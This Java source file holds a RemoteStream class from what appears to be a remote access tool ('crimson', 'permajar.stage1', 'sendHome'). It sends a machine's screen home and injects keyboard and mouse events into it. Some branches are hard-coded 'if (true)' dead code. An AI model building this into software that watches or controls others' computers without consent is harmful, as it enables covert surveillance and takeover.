package subterranean.crimson.universal.streams.remotestream;

import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.HashMap;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.StreamStore;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.remote.Player;
import subterranean.crimson.universal.remote.ScreenCapture;
import subterranean.crimson.universal.remote.robot;
import subterranean.crimson.universal.streams.Stream;

public class RemoteStream extends Stream {

	public ScreenCapture capture;
	public Player player;
	public robot rt = new robot();

	public RemoteStream(long p, boolean i) {
		super(null);
		capture = new ScreenCapture(0, 100, 100);

	}

	public RemoteStream(long p, boolean i, Player plr) {
		super(null, plr.c);
		player = plr;
		if (player != null) {
			ClientCommands.startRemoteStream(plr.c, getStreamID());
		}

		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		start();
	}

	@Override
	public void received(Message m) {
		if (true) {
			if (player == null) {
				// reverse connection
				// nothing should be received
			} else {
				// normal connection
				// receiving a screen
				player.UpdateScreen((HashMap<String, byte[]>) m.auxObject[1]);

			}

		} else {
			if (player == null) {
				// receiving events
				rt.setMouseEvents((ArrayList<MouseEvent>) m.auxObject[2]);
				rt.setKeyEvents((ArrayList<KeyEvent>) m.auxObject[1]);
			} else {
				// receiving a screen
				player.UpdateScreen((HashMap<String, byte[]>) m.auxObject[1]);

			}
			send();
		}

	}

	@Override
	public void send() {
		Message m = new Message(Utilities.randId(), BMN.STREAM_data);
		;
		if (true) {
			if (player == null) {

				m.auxObject = new Object[] { getStreamID(), rt.getChangedScreenBlocks() };
			} else {

				// sending events

				m.auxObject = new Object[] { getStreamID(), player.evl.getKeyEvents(), player.evl.getMouseEvents() };
			}

		} else {
			if (player == null) {
				// sending a screen

				m.auxObject = new Object[] { getStreamID(), rt.getChangedScreenBlocks() };
			} else {
				// send nothing
			}

		}
		if (Platform.isServer) {
			c.send(m);
		} else {
			Communications.sendHome(m);

		}

	}

}
